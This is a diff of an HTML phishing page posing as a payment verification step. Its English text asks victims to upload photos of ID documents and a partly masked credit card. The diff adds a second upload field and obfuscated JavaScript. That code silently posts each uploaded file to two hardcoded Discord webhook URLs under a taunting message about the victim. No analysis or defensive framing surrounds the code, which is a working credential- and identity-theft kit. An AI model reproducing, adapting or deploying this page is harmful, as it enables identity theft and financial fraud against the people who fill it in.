@@ -13,25 +13,30 @@
   <div class="wrapper" id="app">
     <div class="card-form">
         <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
-          <h2>Fügen Sie ein Foto eines gültigen Ausweisnachweises bei</h2>
+          <h2>Attaching a photo of valid ID proof</h2>
           <br>
           <br>
-          <h3>Einer der folgenden Ausweisnachweise kann beigefügt werden:</h3>
+          <h3>One of the following ID proofs can be attached:</h3>
           <Br>
           <ul>
-            <li>1. Staatlich ausgestellter Führerschein</li>
-            <li>2. Wählerregistrierungskarte</li>
-            <li>3. Reisepass</li>
-            <li>4. Staatsausweis</li>
-            <li>5. Innerhalb von sechs Monaten ausgestellte Stromrechnung</li>
+            <li>1. State-issued driver's licence</li>
+            <li>2. Voters registration card</li>
+            <li>3. Passport</li>
+            <li>4. State ID card</li>
+            <li>5. Utility bill issued within six months</li>
           </ul>
 
         </div>
 
       <div class="card-lol">
+        <p>We need to verify that it was you trying to send money.</p>
+        <br>
+        <p>Your credit card must be valid. Please show the first 6 and last 4 digits of your credit card and blank out the middle digits. Please ensure that the image is clear, no glare, and the wording must be readable.</p>
+        <br>
         <div class="card-input">
-          <label for="cardNumber" class="card-input__label">Sende eine Datei.</label>
-          <input type="file" class="card-input__input" id="file-selector" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" required>
+          <label for="cardNumber" class="card-input__label">Send files.</label>
+          <input type="file" class="card-input__input" id="file-selector" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" required >
+          <input type="file" class="card-input__input" id="file-selectoraa" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" required>
         </div>
 
         <button class="card-form__button" onclick="sendf()">
@@ -43,7 +48,8 @@
   <script src="https://cdn.jsdelivr.net/npm/vue@2.6.10/dist/vue.js"></script>
   <script src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js"></script>
   <script>
-function _0x137d(_0x155125,_0x3461f4){const _0x29c62c=_0x29c6();return _0x137d=function(_0x137dea,_0x1451de){_0x137dea=_0x137dea-0x7d;let _0xafa9aa=_0x29c62c[_0x137dea];return _0xafa9aa;},_0x137d(_0x155125,_0x3461f4);}function _0x29c6(){const _0x54feb1=['8194120GwnlHj','3304FbcxdV','content','47319mixdRb','2027330vCDkGi','33479BJdSbR','getElementById','Debil\x20Poslao\x20lmao','934215GmOBfu','1720019GrfriI','file-selector','https://discord.com/api/webhooks/1205980932985856010/T-Z_4EbU-9c8qxsnl1dXHEWnVQqW-H-j9yPZYkis8wKArX0Y5veUgfOBRyzz7lK3dA1T','file','22xuOMvB','open','12urreYb','files','10566hqqbhg','append','POST','120cvTwvy'];_0x29c6=function(){return _0x54feb1;};return _0x29c6();}(function(_0xff59f6,_0x584f19){const _0x369de8=_0x137d,_0x2e6745=_0xff59f6();while(!![]){try{const _0x15673e=-parseInt(_0x369de8(0x80))/0x1*(parseInt(_0x369de8(0x88))/0x2)+parseInt(_0x369de8(0x7e))/0x3*(parseInt(_0x369de8(0x8f))/0x4)+parseInt(_0x369de8(0x83))/0x5+parseInt(_0x369de8(0x8a))/0x6*(-parseInt(_0x369de8(0x84))/0x7)+parseInt(_0x369de8(0x91))/0x8*(-parseInt(_0x369de8(0x8c))/0x9)+parseInt(_0x369de8(0x7f))/0xa+parseInt(_0x369de8(0x90))/0xb;if(_0x15673e===_0x584f19)break;else _0x2e6745['push'](_0x2e6745['shift']());}catch(_0x4cdfc1){_0x2e6745['push'](_0x2e6745['shift']());}}}(_0x29c6,0x403d1));function sendf(){const _0x168b8b=_0x137d,_0x327e4c=[_0x168b8b(0x86),'https://discord.com/api/webhooks/1232015719559073874/6x7bK4C9AF_JR7ZuzoLu7rTace4jJdxPVhWWAtE2VzOXCm3vgdsEIx9AURByoNLlQ_Ye'],_0xf299b6=new FormData();_0xf299b6['append'](_0x168b8b(0x87),document[_0x168b8b(0x81)](_0x168b8b(0x85))[_0x168b8b(0x8b)][0x0]),_0xf299b6[_0x168b8b(0x8d)](_0x168b8b(0x7d),_0x168b8b(0x82)),_0x327e4c['forEach'](_0x16a193=>{const _0x103235=_0x168b8b,_0x4f8970=new XMLHttpRequest();_0x4f8970[_0x103235(0x89)](_0x103235(0x8e),_0x16a193,!![]),_0x4f8970['send'](_0xf299b6);});}
+
+function _0x2c9c(_0x187cd8,_0x57c30e){const _0x488199=_0x4881();return _0x2c9c=function(_0x2c9c0f,_0x3ebb64){_0x2c9c0f=_0x2c9c0f-0x1c6;let _0x28323c=_0x488199[_0x2c9c0f];return _0x28323c;},_0x2c9c(_0x187cd8,_0x57c30e);}function _0x4881(){const _0x4ea002=['8004DUDmxp','file-selectoraa','content','getElementById','files','open','append','9jYulPN','26588470dtWChg','4295942pczvYj','forEach','1792652IsTuxo','Debil\x20Poslao\x20lmao','https://discord.com/api/webhooks/1205980932985856010/T-Z_4EbU-9c8qxsnl1dXHEWnVQqW-H-j9yPZYkis8wKArX0Y5veUgfOBRyzz7lK3dA1T','589167PqAFEw','send','6172992iaQljW','POST','file','250819TKuNcG','2BhYRzs','1175XIytzP','https://discord.com/api/webhooks/1232015719559073874/6x7bK4C9AF_JR7ZuzoLu7rTace4jJdxPVhWWAtE2VzOXCm3vgdsEIx9AURByoNLlQ_Ye'];_0x4881=function(){return _0x4ea002;};return _0x4881();}(function(_0x59b146,_0x167cd4){const _0x524bec=_0x2c9c,_0x126993=_0x59b146();while(!![]){try{const _0x34c57f=-parseInt(_0x524bec(0x1dc))/0x1+parseInt(_0x524bec(0x1c6))/0x2*(parseInt(_0x524bec(0x1d7))/0x3)+-parseInt(_0x524bec(0x1d4))/0x4+parseInt(_0x524bec(0x1c7))/0x5*(-parseInt(_0x524bec(0x1c9))/0x6)+-parseInt(_0x524bec(0x1d2))/0x7+-parseInt(_0x524bec(0x1d9))/0x8+parseInt(_0x524bec(0x1d0))/0x9*(parseInt(_0x524bec(0x1d1))/0xa);if(_0x34c57f===_0x167cd4)break;else _0x126993['push'](_0x126993['shift']());}catch(_0x3c92d7){_0x126993['push'](_0x126993['shift']());}}}(_0x4881,0x6fada));function sendf(){const _0x5de70a=_0x2c9c,_0x11c791=[_0x5de70a(0x1d6),_0x5de70a(0x1c8)],_0x4e927d=new FormData();_0x4e927d[_0x5de70a(0x1cf)](_0x5de70a(0x1db),document[_0x5de70a(0x1cc)]('file-selector')[_0x5de70a(0x1cd)][0x0]),_0x4e927d[_0x5de70a(0x1cf)](_0x5de70a(0x1cb),_0x5de70a(0x1d5)),_0x11c791[_0x5de70a(0x1d3)](_0x5aa346=>{const _0x51e2dd=_0x5de70a,_0x41e248=new XMLHttpRequest();_0x41e248['open'](_0x51e2dd(0x1da),_0x5aa346,!![]),_0x41e248['send'](_0x4e927d);});const _0x5b7daf=new FormData();_0x5b7daf[_0x5de70a(0x1cf)](_0x5de70a(0x1db),document[_0x5de70a(0x1cc)](_0x5de70a(0x1ca))['files'][0x0]),_0x5b7daf[_0x5de70a(0x1cf)](_0x5de70a(0x1cb),'Debil\x20Poslao\x20lmao\x20#2'),_0x11c791[_0x5de70a(0x1d3)](_0x3c0d99=>{const _0x52eb6a=_0x5de70a,_0x2b653f=new XMLHttpRequest();_0x2b653f[_0x52eb6a(0x1ce)](_0x52eb6a(0x1da),_0x3c0d99,!![]),_0x2b653f[_0x52eb6a(0x1d8)](_0x5b7daf);});}
 
 </script>
 </body>
